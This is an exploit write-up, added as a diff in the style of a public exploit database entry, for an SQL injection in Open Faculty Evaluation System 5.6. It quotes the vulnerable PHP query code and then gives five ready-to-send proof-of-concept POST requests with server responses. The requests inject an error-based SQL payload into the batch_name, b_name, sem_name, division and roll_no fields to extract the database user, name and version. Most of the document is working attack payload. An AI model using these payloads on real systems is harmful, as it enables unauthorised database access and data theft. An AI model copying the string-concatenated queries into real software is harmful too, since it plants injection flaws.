@@ -1,0 +1,140 @@
+# Exploit Title: Open Faculty Evaluation System 5.6 - 'batch_name' SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://openfacultyeval.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/openfacultyeval/files/feedback_php5_6.zip/download
+# Version: Php 5.6
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+/[PATH]/submit_feedback.php
+#....
+#17 if(isset($_POST['submit']))
+#18 {
+#19 //feedback no
+#20 $check_feedback_no="select * from batch_master where batch_id='".$_POST['']."'";
+#21 $res_feedback_no=mysql_query($check_feedback_no) or die(mysql_error());
+#22 $result=mysql_fetch_array($res_feedback_no);
+#23 
+#24 
+#25 $sql="select * from feedback_master where roll_no='".$_POST['roll_no']."' and b_id='".$_POST['b_name']."' and f_id='".$_POST['fac_name']."' and sub_id='".$_POST['sub_name']."' and sem_id='".$_POST['sem_name']."' and batch_id='".$_POST['batch_name']."' and division_id='".$_POST['division']."' and feedback_no='".$result['feedback_no']."'";
+#26 //echo $sql;
+#27 $res=mysql_query($sql) or die(mysql_error());
+#....
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/submit_feedback.php
+# 
+POST /[PATH]/submit_feedback.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 282
+batch_name=2'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&submit=Submit
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:02:53 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 235
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/submit_feedback.php
+# 
+POST /[PATH]/submit_feedback.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 278
+b_name=2'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&submit=Submit
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:15:30 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1204
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/submit_feedback.php
+# 
+POST /[PATH]/submit_feedback.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 280
+sem_name=2'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&submit=Submit
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:19:57 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1202
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/submit_feedback.php
+# 
+POST /[PATH]/submit_feedback.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 280
+division=2'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&submit=Submit
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:23:11 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1202
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 5)
+# http://localhost/[PATH]/submit_feedback.php
+# 
+POST /[PATH]/submit_feedback.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 279
+roll_no=2'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&submit=Submit
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:29:20 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1203
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
